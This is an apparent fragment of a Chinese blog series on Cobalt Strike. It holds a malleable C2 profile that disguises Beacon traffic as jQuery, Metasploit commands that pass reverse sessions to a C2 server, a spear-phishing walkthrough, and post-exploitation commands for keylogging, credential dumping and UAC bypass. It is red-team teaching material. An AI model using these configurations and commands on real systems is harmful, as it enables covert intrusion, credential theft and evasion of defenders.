cleanup \"true\"; # CS 3.12 Addition \"Obfuscate and Sleep\" set sleep_mask \"true\"; # CS 4.1 set smartinject \"true\"; # Make the Beacon Reflective DLL look like something else in memory # Values captured using peclone agaist a Windows 10 version of explorer.exe set checksum \"0\"; set compile_time \"11 Nov 2016 04:08:32\"; set entry_point \"650688\"; set image_size_x86 \"4661248\"; set image_size_x64 \"4661248\"; set name \"srv.dll\"; set rich_header \"\\x3e\\x98\\xfe\\x75\\x7a\\xf9\\x90\\x26\\x7a\\xf9\\x90\\x26\\x7a\\xf9\\x90\\x26\\x73\\x81\\x03\\x26\\xfc\\xf9\\x90\\x26\\x17\\xa4\\x93\\x27\\x79\\xf9\\x90\\x26\\x7a\\xf9\\x91\\x26\\x83\\xfd\\x90\\x26\\x17\\xa4\\x91\\x27\\x65\\xf9\\x90\\x26\\x17\\xa4\\x95\\x27\\x77\\xf9\\x90\\x26\\x17\\xa4\\x94\\x27\\x6c\\xf9\\x90\\x26\\x17\\xa4\\x9e\\x27\\x56\\xf8\\x90\\x26\\x17\\xa4\\x6f\\x26\\x7b\\xf9\\x90\\x26\\x17\\xa4\\x92\\x27\\x7b\\xf9\\x90\\x26\\x52\\x69\\x63\\x68\\x7a\\xf9\\x90\\x26\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"; ## WARNING: Module stomping # Cobalt Strike 3.11 also adds module stomping to Beacon's Reflective Loader. When enabled, Beacon's loader will shun Vir","date":"2024-01-17","objectID":"/2024/01/cobalt_strike_basic_no.3/:1:11","tags":["C2"],"title":"Cobalt Strike Basic No.3 -- Malleable C2 Profile","uri":"/2024/01/cobalt_strike_basic_no.3/"},{"categories":["Pentesting"],"content":"HTTP Headers ################################################ ## HTTP Headers ################################################ ## Description: ## The http-config block has influence over all HTTP responses served by Cobalt Strike’s web server. Here, you may specify additional HTTP headers and the HTTP header order. ## Values: ## set headers \"Comma separated list of headers\" The set headers option specifies the order these HTTP headers are delivered in an HTTP response. Any headers not in this list are added to the end. ## header \"headername\" \"header alue The header keyword adds a header value to each of Cobalt Strike's HTTP responses. If the header value is already defined in a response, this value is ignored. ## set trust_x_forwarded_for \"true\" Adds this header to determine remote address of a request. ## block_useragents \"curl*,lynx*,wget*\" Default useragents that are blocked ## Guidelines: ## - Use this section in addition to the \"server\" secion in http-get and http-post to further define the HTTP headers http-config { set headers \"Date, Server, Content-Length, Keep-Alive, Connection, Content-Type\"; header \"Server\" \"Apache\"; header \"Keep-Alive\" \"timeout=10, max=100\"; header \"Connection\" \"Keep-Alive\"; # Use this option if your teamserver is behind a redirector set trust_x_forwarded_for \"true\"; # Block Specific User Agents with a 404 (added in 4.3) set block_useragents \"curl*,lynx*,wget*\"; } http-config块控制了CS的web服务器的全局的http响应的相关设置，可以在这里自定义响应包的header的相关内容。 ","date":"2024-01-17","objectID":"/2024/01/cobalt_strike_basic_no.3/:1:12","tags":["C2"],"title":"Cobalt Strike Basic No.3 -- Malleable C2 Profile","uri":"/2024/01/cobalt_strike_basic_no.3/"},{"categories":["Pentesting"],"content":"HTTP GET ################################################ ## HTTP GET ################################################ ## Description: ## GET is used to poll teamserver for tasks ## Defaults: ## uri \"/activity\" ## Headers (Sample) ## Accept: */* ## Cookie: CN7uVizbjdUdzNShKoHQc1HdhBsB0XMCbWJGIRF27eYLDqc9Tnb220an8ZgFcFMXLARTWEGgsvWsAYe+bsf67HyISXgvTUpVJRSZeRYkhOTgr31/5xHiittfuu1QwcKdXopIE+yP8QmpyRq3DgsRB45PFEGcidrQn3/aK0MnXoM= ## User-Agent Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1) ## Guidelines: ## - Add customize HTTP headers to the HTTP traffic of your campaign ## - Analyze sample HTTP traffic to use as a reference ## - Multiple URIs can be added. Beacon will randomly pick from these. ## - Use spaces as a URI seperator http-get { set uri \"/jquery-3.3.1.min.js\"; set verb \"GET\"; client { header \"Accept\" \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\"; header \"Host\" \"code.jquery.com\"; header \"Referer\" \"http://code.jquery.com/\"; header \"Accept-Encoding\" \"gzip, deflate\"; # 元数据放在cookie头中，并进行base64url编码 metadata { base64url; prepend \"__cfduid=\"; header \"Cookie\"; } } server { # 如果teamserver有任务，则会在http body部分回传给client。 header \"Server\" \"NetDNA-cache/2.2\"; header \"Cache-Control\" \"max-age=0, no-cache\"; header \"Pragma\" \"no-cache\"; header \"Connection\" \"keep-alive\"; header \"Content-Type\" \"application/javascript; charset=utf-8\"; output { mask; base64url; ## The javascript was changed. Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values) # 2nd Line prepend \"!function(e,t)...省略...P=\\\"\\r\"; # 1st Line prepend \"/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */\"; append \"\\\".(o=t.documentElement...省略...t||(e.jQuery=e.$=w),w});\"; print; } } } 修改HTTP Get类型的请求/响应，用于检查teamserver的任务，也就是心跳包。 ","date":"2024-01-17","objectID":"/2024/01/cobalt_strike_basic_no.3/:1:13","tags":["C2"],"title":"Cobalt Strike Basic No.3 -- Malleable C2 Profile","uri":"/2024/01/cobalt_strike_basic_no.3/"},{"categories":["Pentesting"],"content":"HTTP POST ################################################ ## HTTP POST ################################################ ## Description: ## POST is used to send output to the teamserver ## Can use HTTP GET or POST to send data ## Note on using GET: Beacon will automatically chunk its responses (and use multiple requests) to fit the constraints of an HTTP GET-only channel. ## Defaults: ## uri \"/activity\" ## Headers (Sample) ## Accept: */* ## Cookie: CN7uVizbjdUdzNShKoHQc1HdhBsB0XMCbWJGIRF27eYLDqc9Tnb220an8ZgFcFMXLARTWEGgsvWsAYe+bsf67HyISXgvTUpVJRSZeRYkhOTgr31/5xHiittfuu1QwcKdXopIE+yP8QmpyRq3DgsRB45PFEGcidrQn3/aK0MnXoM= ## User-Agent Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1) ## Guidelines: ## - Decide if you want to use HTTP GET or HTTP POST requests for this section ## - Add customize HTTP headers to the HTTP traffic of your campaign ## - Analyze sample HTTP traffic to use as a reference ## Use HTTP POST for http-post section ## Uncomment this Section to activate http-post { set uri \"/jquery-3.3.2.min.js\"; set verb \"POST\"; client { header \"Accept\" \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\"; #header \"Host\" \"code.jquery.com\"; header \"Referer\" \"http://code.jquery.com/\"; header \"Accept-Encoding\" \"gzip, deflate\"; # id标签是将beacon ID先后进行mask、base64url编码后拼接在自定义的__cfduid参数后。 id { mask; base64url; parameter \"__cfduid\"; } # output标签是beacon执行完后把数据mask、base64url编码后回传给teamserver output { mask; base64url; print; } } server { header \"Server\" \"NetDNA-cache/2.2\"; header \"Cache-Control\" \"max-age=0, no-cache\"; header \"Pragma\" \"no-cache\"; header \"Connection\" \"keep-alive\"; header \"Content-Type\" \"application/javascript; charset=utf-8\"; output { mask; base64url; ## The javascript was changed. Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values) # 2nd Line prepend \"!function(e,t)...省略...P=\\\"\\r\"; # 1st Line prepend \"/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */\"; append \"\\\".(o=t.documentElement...省略...t||(e.jQuery=e.$=w),w});\"; print; } } } http-post部分用作beacon对teamserver发出的命令的响应，也就是控制命令执行结果传输的具体细节。 ","date":"2024-01-17","objectID":"/2024/01/cobalt_strike_basic_no.3/:1:14","tags":["C2"],"title":"Cobalt Strike Basic No.3 -- Malleable C2 Profile","uri":"/2024/01/cobalt_strike_basic_no.3/"},{"categories":["Pentesting"],"content":"生成方式 除了上面的https://github.com/threatexpress/malleable-c2的例子，我们也可以使用https://github.com/threatexpress/random_c2_profile项目生成随机的profile，根据自己需要进行定制即可。 ","date":"2024-01-17","objectID":"/2024/01/cobalt_strike_basic_no.3/:1:15","tags":["C2"],"title":"Cobalt Strike Basic No.3 -- Malleable C2 Profile","uri":"/2024/01/cobalt_strike_basic_no.3/"},{"categories":["Pentesting"],"content":"说明 profile的修改主要可以分为流量侧和主机侧流量侧主要涉及http-get和http-post两个标签，主机侧主要涉及stage、process-inject、post-ex这三个标签。在实战时，根据具体情况进行对应修改即可。 ","date":"2024-01-17","objectID":"/2024/01/cobalt_strike_basic_no.3/:1:16","tags":["C2"],"title":"Cobalt Strike Basic No.3 -- Malleable C2 Profile","uri":"/2024/01/cobalt_strike_basic_no.3/"},{"categories":["Pentesting"],"content":"CS基础知识记录","date":"2024-01-15","objectID":"/2024/01/cobalt_strike_basic_no.2/","tags":["C2"],"title":"Cobalt Strike Basic No.2 -- Attack and Post Exploitation","uri":"/2024/01/cobalt_strike_basic_no.2/"},{"categories":["Pentesting"],"content":"Cobalt Strike的攻击方式和后渗透相关内容。 ","date":"2024-01-15","objectID":"/2024/01/cobalt_strike_basic_no.2/:0:0","tags":["C2"],"title":"Cobalt Strike Basic No.2 -- Attack and Post Exploitation","uri":"/2024/01/cobalt_strike_basic_no.2/"},{"categories":["Pentesting"],"content":"一、目标攻击 ","date":"2024-01-15","objectID":"/2024/01/cobalt_strike_basic_no.2/:1:0","tags":["C2"],"title":"Cobalt Strike Basic No.2 -- Attack and Post Exploitation","uri":"/2024/01/cobalt_strike_basic_no.2/"},{"categories":["Pentesting"],"content":"客户端程序攻击 一种依靠应用程序使用控制端来进行的可视化攻击。 随着时代发展到了今天，在有各种WAF、防火墙的情况下，各种漏洞已经很难像过去那么好被利用了，攻击者想绕过防火墙发动攻击也不是那么容易的了。 而当我们发送一个钓鱼文件到客户端上，再由客户端打开这个文件，最后客户端穿过防火墙回连到我们，此时在客户端上我们就获得了一个立足点foothold。这样的一个过程是相对而言是较为容易的，这也是为什么要进行客户端攻击。 ","date":"2024-01-15","objectID":"/2024/01/cobalt_strike_basic_no.2/:1:1","tags":["C2"],"title":"Cobalt Strike Basic No.2 -- Attack and Post Exploitation","uri":"/2024/01/cobalt_strike_basic_no.2/"},{"categories":["Pentesting"],"content":"系统侦察 System Profiler是一个方便客户端攻击的侦察工具，这个工具将会在CS服务端上启动一个Web服务，这样当目标访问这个Web服务的时候，我们就能够看到目标使用的浏览器、操作系统等等指纹信息。 设置系统侦察需要首先在自己的VPS服务器上运行CS服务端，之后本地客户端进行连接，选择System Profiler功能模块，配置待跳转的URL等信息即可。 如果勾选了Use Java Applet to get information则可以发现目标的Java版本及内网IP地址，但是这样做被发现的风险就会提高，同时现在浏览器已经默认关闭了java执行权限，因此这个选项的作用也变得不大了。 配置完成后，目标打开配置后的链接后，可以在三个地方进行观察： View --\u003e Applications View --\u003e Web Log Cobalt Strike --\u003e Visualization --\u003e Target Table 目标打开链接后，在CS上就可以看到目标使用的浏览器版本、系统版本等信息，然后就可以搜索相关的漏洞。 值得注意的是，如果CS的web服务器收到了lynx、wget或curl的请求，CS会自动返回一个404，防止被蓝队窥探。 ","date":"2024-01-15","objectID":"/2024/01/cobalt_strike_basic_no.2/:1:2","tags":["C2"],"title":"Cobalt Strike Basic No.2 -- Attack and Post Exploitation","uri":"/2024/01/cobalt_strike_basic_no.2/"},{"categories":["Pentesting"],"content":"Cobalt Strike的攻击方式 User-Driven Attacks 用户驱动攻击，即需要欺骗用户进行交互以达到攻击目的的一种攻击方式。 首先用户驱动攻击不包含恶意攻击代码，因此可以绕过系统的安全补丁防御；其次无论目标使用什么版本的程序，我们都可以创建相应的功能来执行；最后用户驱动攻击的方式比较可靠稳定。 CS内置了几个用户驱动攻击的选项，在最新的4.9版本中，已经没有原来的Attacks --\u003e Packages，而是拆分到了Payloads和Attacks两个选项下。 User-Driven Payload 在Payloads选项下，包含的payload类型如下： 1、HTML Application HTML应用HTML Application生成(executable/VBA/powershell)这3种原理不同的VBScript实现的evil.hta文件。（实测win10就已经失效，不起作用了。） 2、Microsoft Office Macro Microsoft Office 宏文件Microsoft Office Document Macros可以生成恶意宏放入office文件，非常经典的攻击手法。（实测win版本excel无效，wps不启用宏。） 3、Stager/Stageless Payload Generator Payload生成器Payload Generator可以生成各种语言版本的Payload，便于进行免杀。 4、Windows Stager Payload Windows 可执行文件Windows Executable 会生成一个Windows可执行文件或DLL文件。默认x86，勾选x64表示包含x64 payload stage生成了artifactX64.exe(17kb) artifactX64.dll(17kb) 5、Windows Stageless Payload Windows 可执行文件（Stageless）Windows Executable (Stageless)会生成一个无进程的Windows可执行文件或DLL文件。其中的 Stageless 表示把包含payload在内的”全功能”被控端都放入生成的可执行文件beconX64.exe(313kb) beconX64.dll(313kb) becon.ps1(351kb) User-Driven Attacks 在Attacks选项下，包含的web类攻击方式有： 1、Scripted Web Delibery(S) 脚本化web托管，为payload提供一个web服务便于下载和执行，类似于msf的Script Web Delivery。 Launch之后，会创建一个web服务，然后给出对应的命令，在目标上执行命令即可获得权限。 2、Signed Applet Attack 这是一个Java自签名的Applet的攻击，CS会启动一个Web服务以提供自签名的Java Applet的运行环境，浏览器会要求用户授予Applet运行权限。目标同意后，就会获取权限。（这种攻击方法目前已经基本处于过时状态。） 设置好listener之后，在目标侧访问给出的链接： 3、Smart Applet Attacks 智能化Applet攻击，会自动检测Java版本并利用已知的漏洞绕过安全沙箱，CS官方称该方法应过时，实战环境无效。 联动MSF 如果想使用MSF对目标进行漏洞利用，再通过这个漏洞来传输Beacon的话，也是可以的。 1、首先在MSF上选择攻击模块 2、接着在MSF上设置Payload为windows/meterpreter/reverse_http或者windows/meterpreter/reverse_https，这么做是因为CS的Beacon与MSF的分阶段协议是相兼容的。 3、之后在MSF中设置Payload的LHOST、LPORT为CS中Beacon的监听器IP及端口。 4、然后设置 DisablePayloadHandler 为 True，此选项会让 MSF 避免在其内起一个 handler 来服务你的 payload 连接，也就是告诉MSF说我们已经建立了监听器，不必再新建监听器了。 5、再设置 PrependMigrate 为 True，此选项让 MSF 前置 shellcode 在另一个进程中运行 payload stager。如果被利用的应用程序崩溃或被用户关闭，这会帮助 Beacon 会话存活。 6、最后运行exploit -j，-j 是指作为job开始运行，即在后台运行。 操作 在CS中新建一个HTTP Beacon，创建过程不再赘述。 1、在MSF中选择攻击模块，根据教程这里选择的adobe_flash_hacking_team_uaf模块，不过个人感觉现在这个模块已经不太能被利用成功了。 use exploit/multi/browser/adobe_flash_hacking_team_uaf 2、接着配置payload，这里选择revese_http payload set payload windows/meterpreter/reverse_http set LHOST cs_server_ip set LPORT 80 3、之后，配置DisablePayloadHandler、PrependMigrate为 True set DisablePayloadHandler True set PrependMigrate True 4、最后，开始攻击。 exploit -j 鱼叉钓鱼 四个步骤： 创建目标清单 制作邮件模版或者使用现成模版 选择邮件服务器 发送邮件 标清单 目标清单就是每行一个邮件地址的txt文件，即每行包含一个目标。 在一行中除了邮件地址也可以使用标签或一个名字。如果提供了名称，则有助于 Cobalt Strike 自定义每个网络钓鱼。 这里使用一些在线邮件接收平台的邮箱地址作为示例。 astrqb79501@chacuo.net test1 gswtdm26180@chacuo.net test2 ypmgin95416@chacuo.net test3 将以上内容保存为txt文本文件，就创建好了自己的目标清单。 模板 使用模板的好处在于可以重复利用，制作钓鱼模板也很简单。可以先在邮箱中找一封广告邮件，查看邮件原始信息，一般在邮件的选项里能找到这个功能，然后导出为.eml文件作为模板。 发送邮件 有了目标和模板，然后选好自己的邮件服务器，之后就可以发送消息了。 在CS客户端中，点击Attacks --\u003e Spear Phish即可打开网络钓鱼模块。添加上目标、模板、钓鱼地址、邮箱服务、退回邮箱，其中Bounce To为退回邮件接收地址，注意要和配置邮件服务器时填的邮箱一致，否则会报错。 所有信息添加完成后，可以点击Preview查看。如果感觉效果不错，就可以点击send发送了。 当目标收到钓鱼邮件，并且点击钓鱼邮件中的链接后，如果钓鱼链接配置的没有问题，CS就能够上线了。 ","date":"2024-01-15","objectID":"/2024/01/cobalt_strike_basic_no.2/:1:3","tags":["C2"],"title":"Cobalt Strike Basic No.2 -- Attack and Post Exploitation","uri":"/2024/01/cobalt_strike_basic_no.2/"},{"categories":["Pentesting"],"content":"二、后渗透 ","date":"2024-01-15","objectID":"/2024/01/cobalt_strike_basic_no.2/:2:0","tags":["C2"],"title":"Cobalt Strike Basic No.2 -- Attack and Post Exploitation","uri":"/2024/01/cobalt_strike_basic_no.2/"},{"categories":["Pentesting"],"content":"Beacon管理 Beacon 控制台 在一个 Beacon 会话上右击 interact（交互）即可打开 Beacon 控制台，如果想对多个会话进行控制，也只需选中多个会话，执行相关功能即可。 在 Beacon 的控制台中的输入与输出之间，是一个状态栏，状态栏上的信息分别是：目标 NetBIOS 名称、用户名、会话PID以及 Beacon 最近一次连接到 CS 团队服务器的时间。 Beacon 控制台是在使用 CS 的过程中，很经常用到的功能，向 Beacon 发出的每个命令，都可以在这里看到，如果队友发送了消息，在 Beacon 控制台同样能看到，消息前还会显示队友的名称。 Beacon 菜单 Access：包含了一些对凭据的操作及提权的选项 Explore：包含了信息探测与目标交互的选项 Pivoting：包含了一些设置代理隧道的选项 Session：包含了对当前 Beacon 会话管理的选项 Beacon 命令 help：查看 Beacon 命令的帮助信息。使用 help + 待查看帮助的命令可查看该命令的帮助信息。 clear：清除 Beacon 命令队列。Beacon 是一个异步的 Payload，输入的命令并不会立即执行，而是当 Beacon 连接到团队服务器时再一一执行命令，因此当需要清除队列命令时就可以使用 clear 命令。 sleep：改变 Beacon 的休眠时间。输入 sleep 30表示休眠30秒；输入sleep 60 50表示，随机睡眠 30秒至60秒，其中30秒 = 60 x 50%；如果输入 sleep 0则表示进入交互模式，任何输入的命令都会被立即执行，当输入一些命令，比如desktop时， Beacon 会自动进入交互模式。 shell：通过受害主机的 cmd.exe 执行命令。比如运行ipconfig，就需要输入shell ipconfig run：不使用 cmd.exe 执行命令。该命令也是 run + 命令的形式运行，该命令会将执行结果回显。 execute：执行命令，但不回显结果。 cd：切换当前工作目录。 pwd：查看当前所在目录。 powershell：通过受害主机的 PowerShell 执行命令。比如想在 PowerShell 下运行 ipconfig，就需要输入powershell ipconfig powerpick：不使用 powershell.exe 执行 powershell 命令。这个命令依赖于由 Lee Christensen 开发的非托管 PowerShell 技术。powershell 和 powerpick 命令会使用当前令牌（ token ）。 psinject：将非托管的 PowerShell 注入到一个特定的进程中并从此位置运行命令。 powershell-import：导入 PowerShell 脚本到 Beacon 中。直接运行 powershell-import + 脚本文件路径即可，但是这个脚本导入命令一次仅能保留一个 PowerShell 脚本，再导入一个新脚本的时候，上一个脚本就被覆盖了，因此可以通过导入一个空文件来清空 Beacon 中导入的脚本。 powershell get-help：获取 PowerShell 命令的相关帮助信息。比如想获取 PowerShell 下 get-process 命令的帮助，就需要输入powershell get-help get-process execute-assembly：将一个本地的 .NET 可执行文件作为 Beacon 的后渗透任务来运行。 setenv：设置一个环境变量。 Command Description ------- ----------- ! Run a command from the history argue Spoof arguments for matching processes blockdlls Block non-Microsoft DLLs in child processes browserpivot Setup a browser pivot session cancel Cancel a download that's in-progress cd Change directory checkin Call home and post data chromedump Recover credentials from Google Chrome clear Clear beacon queue clipboard Attempt to get text clipboard contents connect Connect to a Beacon peer over TCP covertvpn Deploy Covert VPN client cp Copy a file data-store Store post-ex items to Beacon dcsync Extract a password hash from a DC desktop View and interact with target's desktop dllinject Inject a Reflective DLL into a process dllload Load DLL into a process with LoadLibrary() download Download a file downloads Lists file downloads in progress drives List drives on target elevate Spawn a session in an elevated context execute Execute a program on target (no output) execute-assembly Execute a local .NET program in-memory on target exit Terminate the beacon session file_browser Open the file browser tab for this beacon getprivs Enable system privileges on current token getsystem Attempt to get SYSTEM getuid Get User ID hashdump Dump password hashes help Help menu history Show the command history inject Spawn a session in a specific process inline-execute Run a Beacon Object File in this session jobkill Kill a long-running post-exploitation task jobs List long-running post-exploitation tasks jump Spawn a session on a remote host kerberos_ccache_use Apply kerberos ticket from cache to this session kerberos_ticket_purge Purge kerberos tickets from this session kerberos_ticket_use Apply kerberos ticket to this session keylogger Start a keystroke logger kill Kill a process link Connect to a Beacon peer over a named pipe logonpasswords Dump credentials and hashes with mimikatz ls List files make_token Create a token to pass credentials mimikatz Runs a mimikatz command mkdir Make a directory mode dns Use DNS A as data channel (DNS beacon only) mode dns-txt Use DNS TXT as data channel (DNS beacon only) mode dns6 Use DNS AAAA as data channel (DNS beacon only) mv Move a file net Network and host enumeration tool note Assign a note to this Beacon portscan Scan a network for open services powerpick Execute a command via Unmanaged PowerShell powershell Execute a command via powershell.exe powershell-import Import a powershell script ppid Set parent PID for spawned po","date":"2024-01-15","objectID":"/2024/01/cobalt_strike_basic_no.2/:2:1","tags":["C2"],"title":"Cobalt Strike Basic No.2 -- Attack and Post Exploitation","uri":"/2024/01/cobalt_strike_basic_no.2/"},{"categories":["Pentesting"],"content":"session传递 会话传递相关命令 Beacon 被设计的最初目的就是向其他的 CS 监听器传递会话。 spawn：进行会话的传递，也可直接右击会话选择spawn命令进行会话的选择。默认情况下，spawn命令会在 rundll32.exe 中派生一个会话。为了更好的隐蔽性，可以找到更合适的程序（如 Internet Explorer） 并使用spawnto命令来说明在派生新会话时候会使用 Beacon 中的哪个程序。 spawnto：该命令会要求指明架构（x86 还是 x64）和用于派生会话的程序的完整路径。单独输入spawnto命令然后按 enter 会指示 Beacon 恢复至其默认行为。 inject：输入inject + 进程 id + 监听器名来把一个会话注入一个特定的进程中。使用 ps 命令来获取一个当前系统上的进程列表。使用inject [pid] x64来将一个64位 Beacon 注入到一个 64位进程中。 spawn和inject命令都将一个 payload stage 注入进内存中。如果 payload stage 是 HTTP、HTTPS 或 DNS Beacon 并且它无法连接到你，那么将看不到一个会话。如果 payload stage 是一个绑定的 TCP 或 SMB 的 Beacon，这些命令会自动地尝试连接到并控制这些 payload。 dllinject：dllinject + [pid]来将一个反射性 DLL 注入到一个进程中。 shinject：使用shinject [pid] [架构] [/路径/.../file.bin]命令来从一个本地文件中注入 shellcode 到一个目标上的进程中。 shspawn：使用shspawn [架构] [/路径/.../file.bin]命令会先派生一个新进程（这个新进程是 spawn to 命令指定的可执行文件），然后把指定的 shellcode 文件（ file.bin ）注入到这个进程中。 dllload：使用dllload [pid] [c:\\路径\\...\\file.dll]来在另一个进程中加载磁盘上的 DLL文件。 会话传递使用场景 1、将当前会话传递至其他CS团队服务器中，直接右击spawn选择要传递的监听器即可。 2、将当前会话传递至MSF中，这里简单做一下演示。 首先，在MSF中，为攻击载荷新建一个payload msf5 \u003e use exploit/multi/handler msf5 exploit(multi/handler) \u003e set payload windows/meterpreter/reverse_https msf5 exploit(multi/handler) \u003e set lhost 192.168.175.156 msf5 exploit(multi/handler) \u003e set lport 443 msf5 exploit(multi/handler) \u003e exploit -j 随后，在CS中新建一个外部Foreign监听器，这里设置的监听IP与端口和MSF中的一致即可，随后在CS中利用spawn选择刚新建的外部监听器，MSF中即可返回会话。 ","date":"2024-01-15","objectID":"/2024/01/cobalt_strike_basic_no.2/:2:2","tags":["C2"],"title":"Cobalt Strike Basic No.2 -- Attack and Post Exploitation","uri":"/2024/01/cobalt_strike_basic_no.2/"},{"categories":["Pentesting"],"content":"File System 浏览会话系统文件位置在右击会话处，选择 Explore --\u003e File Browser即可打开。在这里可以对当前会话下的文件进行浏览、上传、下载、删除等操作。 在进行文件浏览时，如果 beacon 设置的 sleep 值较高，CS会因此而变得响应比较慢。 彩色文件夹表示该文件夹的内容位于此文件浏览器的缓存中；深灰色的文件夹表示该文件夹的内容不在此文件浏览器缓存中。 文件下载 download：下载请求的文件。Beacon 会下载它的任务要求获取的每一个文件的固定大小的块。这个块的大小取决于 Beacon 当前的数据通道。HTTP 和 HTTPS 通道会拉取 512kb 的数据块。 downloads：查看当前 Beacon 正在进行的文件下载列表。 cancel：该命令加上一个文件名来取消正在进行的一个下载任务。也可以在 cancel 命令中使用通配符来一次取消多个文件下载任务。 下载文件都将下载到CS团队服务器中，在View --\u003e Download下可看到下载文件的记录，选中文件后使用Sync Files即可将文件下载到本地。 文件上传 upload：上传一个文件到目标主机上。 timestomp：将一个文件的修改属性访问属性和创建时间数据与另一个文件相匹配。当上传一个文件时，有时会想改变此文件的时间戳来使其混入同一文件夹下的其他文件中，使用timestomp 命令就可以完成此工作。 ","date":"2024-01-15","objectID":"/2024/01/cobalt_strike_basic_no.2/:2:3","tags":["C2"],"title":"Cobalt Strike Basic No.2 -- Attack and Post Exploitation","uri":"/2024/01/cobalt_strike_basic_no.2/"},{"categories":["Pentesting"],"content":"用户驱动溢出攻击 Beacon 运行任务的方式是以jobs去运行的，比如键盘记录、PowerShell 脚本、端口扫描等，这些任务都是在 beacon check in 之间于后台运行的。 jobs：查看当前 Beacon 中的任务 jobkill：加上任务 ID，对指定任务进行停止 屏幕截图 screenshot：获取屏幕截图，使用screenshot pid来将截屏工具注入到一个 x86 的进程中，使用screenshot pid x64注入到一个 x64 进程中，explorer.exe 是一个不错的候选程序。 使用screenshot [pid] [x86|x64] [time]来请求截屏工具运行指定的秒数，并在每一次 Beacon 连接到团队服务器的时候报告一张屏幕截图，这是查看用户桌面的一种简便方法。要查看截屏的具体信息，通过View --\u003e Screenshots来浏览从所有 Beacon 会话中获取的截屏。 键盘记录 keylogger：键盘记录器，使用keylogger pid来注入一个 x86 程序。使用keylogger pid x64来注入一个 x64 程序，explorer.exe 是一个不错的候选程序。 使用单独的 keylogger 命令来将键盘记录器注入一个临时程序。键盘记录器会监视从被注入的程序中的键盘记录并将结果报告给 Beacon，直到程序终止或者自己杀死了这个键盘记录后渗透任务。要查看键盘记录的结果，可以到View --\u003e Keystrokes中进行查看。 其他 除了上述使用命令的方式进行屏幕截图和键盘记录，也可以来到Explore --\u003e Process List下选择要注入的进程，再直接点击屏幕截图或键盘记录的功能按钮。 从使用上，具体注入那个程序都是可以的，只是注入 explorer.exe 会比较稳定与持久。值得注意的是，多个键盘记录器可能相互冲突，每个桌面会话只应使用一个键盘记录器。 ","date":"2024-01-15","objectID":"/2024/01/cobalt_strike_basic_no.2/:2:4","tags":["C2"],"title":"Cobalt Strike Basic No.2 -- Attack and Post Exploitation","uri":"/2024/01/cobalt_strike_basic_no.2/"},{"categories":["Pentesting"],"content":"Browser Pivoting 浏览器劫持是指在已经攻击成功的目标中，利用目标的信息登录网站进行会话劫持，但是目前只支持目标正在使用IE浏览器的前提下。关于如何判断当前用户是否使用IE浏览器，则可以通过屏幕截图来判断。 找到目前正在使用IE浏览器的目标后，右击该会话，选择Explore --\u003e Browser Pivot，随后选择要注入的进程，CS 会在它认为可以注入的进程右边显示一个对勾，设置好端口后，点击运行即可。 此时，在浏览器中配置代理，代理配置为http代理，IP为CS团队服务器IP，端口为刚设置的端口。 代理配置好后，在浏览器中打开目标当前正在打开的网址，即可绕过登录界面。 ","date":"2024-01-15","objectID":"/2024/01/cobalt_strike_basic_no.2/:2:5","tags":["C2"],"title":"Cobalt Strike Basic No.2 -- Attack and Post Exploitation","uri":"/2024/01/cobalt_strike_basic_no.2/"},{"categories":["Pentesting"],"content":"Elevate with an Exploit elevate：列出CS已经注册的权限提升的可用列表 elevate [exploit] [listener]：使用具体的exploit执行权限提升，beacon给到指定的listener 这里给出的可用exp有很多，默认的只有两个，其他的使用了第三方脚本：https://github.com/rsmudge/ElevateKit 此处我们的目标是高版本的windows 10系统，所以上述方法基本全军覆没，我只测试了一个uac-schtasks成功提权到admin： 在尝试了所有方法都不行的时候就需要自行上传提权工具或者exp，进行权限提升。 runasadmin：使用管理员权限执行单条命令 ","date":"2024-01-15","objectID":"/2024/01/cobalt_strike_basic_no.2/:2:6","tags":["C2"],"title":"Cobalt Strike Basic No.2 -- Attack and Post Exploitation","uri":"/2024/01/cobalt_strike_basic_no.2/"},{"categories":["Pentesting"],"content":"Elevate with Known Credentials 如果提前获取了一些账号密码，则可以使用已知的高权限账号密码来提权。 runas [DOMAIN\\user] [password] [command]- This runs a command as another user using their credentials. The runas command will not return any output. You may use runas from a non- privileged context though. spawnas [DOMAIN\\user] [password] [listener] - This command spawns a session as another user using their credentials. This command spawns a temporary process and injects your payload stage into it. 使用这两个命令时，请注意非 SID 500 帐户的凭据将在中等完整性上下文中生成有效负载。 需要使用绕过 UAC 来提升到高完整性上下文。 此外，应该从指定帐户可以读取的工作文件夹运行这些命令。 ","date":"2024-01-15","objectID":"/2024/01/cobalt_strike_basic_no.2/:2:7","tags":["C2"],"title":"Cobalt Strike Basic No.2 -- Attack and Post Exploitation","uri":"/2024/01/cobalt_strike_basic_no.2/"},{"categories":["Pentesting"],"content":"Get SYSTEM 伪造一个SYSTEM账户的token。 getsystem - This command impersonates a token for the SYSTEM account. This level of access may allow you to perform privileged actions that are not possible as an Administrator user. Another way to get SYSTEM is to create a service that runs a payload. The elevate svc-exe [listener] command does this. It will drop an executable that runs a payload, create a service to run it, assume control of the payload, and cleanup the service and executable. ","date":"2024-01-15","objectID":"/2024/01/cobalt_strike_basic_no.2/:2:8","tags":["C2"],"title":"Cobalt Strike Basic No.2 -- Attack and Post Exploitation","uri":"/2024/01/cobalt_strike_basic_no.2/"},{"categories":["Pentesting"],"content":"UAC Bypass 如果当前的用户不是Administrator的话，这种方式可能不成功，所以先用run whoami /groups看一下当前用户是否在Administrators组里面。 常用的有以下几种： elevate uac-token-duplication [listener] - This command spawns a temporary process with elevated rights and inject a payload stage into it. This attack uses a UAC-loophole that allows a non-elevated process to launch an arbitrary process with a token stolen from an elevated process. This loophole requires the attack to remove several rights assigned to the elevated token. The abilities of your new session will reflect these restricted rights. If Always Notify is at its highest setting, this attack requires that an elevated process is already running in the current desktop session (as the same user). This attack works on Windows 7 and Windows 10 prior to the November 2018 update. runasadmin uac-token-duplication [command] - This is the same attack described above, but this variant runs a command of your choosing in an elevated context. runasadmin uac-cmstplua [command] - This command attempta to bypass UAC and run a command in an 